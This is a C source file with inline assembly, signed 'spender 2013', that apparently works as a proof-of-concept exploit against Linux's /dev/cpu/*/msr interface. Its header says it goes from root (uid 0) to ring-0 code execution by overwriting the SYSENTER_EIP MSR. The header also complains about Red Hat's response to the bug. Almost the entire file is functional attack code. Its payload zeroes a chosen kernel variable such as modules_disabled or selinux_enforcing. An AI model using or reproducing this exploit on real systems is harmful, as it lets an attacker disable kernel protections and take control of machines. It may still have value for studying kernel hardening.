// PoC exploit for /dev/cpu/*/msr, 32bit userland on a 64bit host
// can do whatever in the commented area, re-enable module support, etc
// requires CONFIG_X86_MSR and just uid 0
// a small race exists between the time when the MSR is written to the first
// time and when we issue our sysenter
// we additionally require CAP_SYS_NICE to make the race win nearly guaranteed
// configured to take a hex arg of a dword pointer to set to 0
// (modules_disabled, selinux_enforcing, take your pick)
//
// Hello to Red Hat, who has shown yet again to not care until a
// public exploit is released.  Not even a bugtraq entry existed in
// their system until this was published -- and they have a paid team
// of how many?
// It's not as if I didn't mention the problem and existence of an easy
// exploit multiple times prior:
// https://twitter.com/grsecurity/status/298977370776432640
// https://twitter.com/grsecurity/status/297365303095078912
// https://twitter.com/grsecurity/status/297189488638181376
// https://twitter.com/grsecurity/status/297030133628416000
// https://twitter.com/grsecurity/status/297029470072745984
// https://twitter.com/grsecurity/status/297028324134359041
//
// spender 2013

#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/mman.h>

#define SYSENTER_EIP_MSR 0x176

u_int64_t msr;

unsigned long ourstack[65536];

u_int64_t payload_data[16];

extern void *_ring0;
extern void *_ring0_end;

void ring0(void)
{
__asm volatile(".globl _ring0\n"
	"_ring0:\n"
	".intel_syntax noprefix\n"
	".code64\n"
	// set up stack pointer with 'ourstack'
	"mov esp, ecx\n"
	// save registers, contains the original MSR value
	"push rax\n"
	"push rbx\n"
	"push rcx\n"
	"push rdx\n"
	// play with the kernel here with interrupts disabled!
	"mov rcx, qword ptr [rbx+8]\n"
	"test rcx, rcx\n"
	"jz skip_write\n"
	"mov dword ptr [rcx], 0\n"
	"skip_write:\n"
	// restore MSR value before returning
	"mov ecx, 0x176\n" // SYSENTER_EIP_MSR
	"mov eax, dword ptr [rbx]\n"
	"mov edx, dword ptr [rbx+4]\n"
	"wrmsr\n"
	"pop rdx\n"
	"pop rcx\n"
	"pop rbx\n"
	"pop rax\n"
	"sti\n"
	"sysexit\n"
	".code32\n"
	".att_syntax prefix\n"
        ".global _ring0_end\n"
	"_ring0_end:\n"
	);
}

unsigned long saved_stack;

int main(int argc, char *argv[])
{
	cpu_set_t set;
	int msr_fd;
	int ret;
	u_int64_t new_msr;
	struct sched_param sched;
	u_int64_t resolved_addr = 0ULL;

	if (argc == 2)
		resolved_addr = strtoull(argv[1], NULL, 16);

	/* can do this without privilege */
	mlock(_ring0, (unsigned long)_ring0_end - (unsigned long)_ring0);
	mlock(&payload_data, sizeof(payload_data));

	CPU_ZERO(&set);
	CPU_SET(0, &set);

	sched.sched_priority = 99;

	ret = sched_setscheduler(0, SCHED_FIFO, &sched);
	if (ret) {
		fprintf(stderr, "Unable to set priority.\n");
		exit(1);
	}

	ret = sched_setaffinity(0, sizeof(cpu_set_t), &set);
	if (ret) {
		fprintf(stderr, "Unable to set affinity.\n");
		exit(1);
	}

	msr_fd = open("/dev/cpu/0/msr", O_RDWR);
	if (msr_fd < 0) {
		msr_fd = open("/dev/msr0", O_RDWR);
		if (msr_fd < 0) {
			fprintf(stderr, "Unable to open /dev/cpu/0/msr\n");
			exit(1);
		}
	}
	lseek(msr_fd, SYSENTER_EIP_MSR, SEEK_SET);
	ret = read(msr_fd, &msr, sizeof(msr));
	if (ret != sizeof(msr)) {
		fprintf(stderr, "Unable to read /dev/cpu/0/msr\n");
		exit(1);
	}

	// stuff some addresses in a buffer whose address we
	// pass to the "kernel" via register
	payload_data[0] = msr;
	payload_data[1] = resolved_addr;

	printf("Old SYSENTER_EIP_MSR = %016llx\n", msr);
	fflush(stdout);

	lseek(msr_fd, SYSENTER_EIP_MSR, SEEK_SET);
	new_msr = (u_int64_t)(unsigned long)&_ring0;

	printf("New SYSENTER_EIP_MSR = %016llx\n", new_msr);
	fflush(stdout);

	ret = write(msr_fd, &new_msr, sizeof(new_msr));
	if (ret != sizeof(new_msr)) {
		fprintf(stderr, "Unable to modify /dev/cpu/0/msr\n");
		exit(1);
	}

	__asm volatile(
		".intel_syntax noprefix\n"
		".code32\n"
		"mov saved_stack, esp\n"
		"lea ecx, ourstack\n"
		"lea edx, label2\n"
		"lea ebx, payload_data\n"
		"sysenter\n"
		"label2:\n"
		"mov esp, saved_stack\n"
		".att_syntax prefix\n"
	);

	printf("Success.\n");

	return 0;
}